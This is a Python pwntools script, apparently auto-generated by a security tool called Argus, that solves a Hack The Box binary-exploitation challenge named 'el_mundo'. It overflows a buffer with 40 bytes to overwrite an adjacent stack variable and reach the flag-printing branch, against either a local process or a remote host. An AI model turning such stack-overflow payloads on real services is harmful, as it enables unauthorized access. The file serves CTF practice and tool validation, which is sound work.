#!/usr/bin/env python3
# Argus-generated variable-overwrite PoC scaffold
# Chain: chains.variable_overwrite
# Binary: /mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7359-6c52-485c-a48b-caa2fe6b7fce/challenge/el_mundo
#
# Payload overwrites an adjacent stack guard variable to satisfy its
# comparison check and trigger the privileged branch (e.g. read_flag).
# No RIP control is needed — the overflow is deliberate and bounded.
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'

fname = '/mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7359-6c52-485c-a48b-caa2fe6b7fce/challenge/el_mundo'

OVERWRITE_OFFSET = 40  # read() declared size = 256

def exploit(target):
    payload  = b'A' * OVERWRITE_OFFSET
    payload += p8(0x38)  # != 0x37 — triggers else/win branch of if (var == 0x37)
    target.sendlineafter(b'> ', payload)
    return target.recvall(timeout=3)

if __name__ == '__main__':
    import sys
    if len(sys.argv) >= 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = process(fname)
    out = exploit(r)
    flag = [l for l in out.decode(errors='replace').splitlines() if 'HTB' in l or 'flag' in l.lower()]
    print(flag[0] if flag else out[:200])
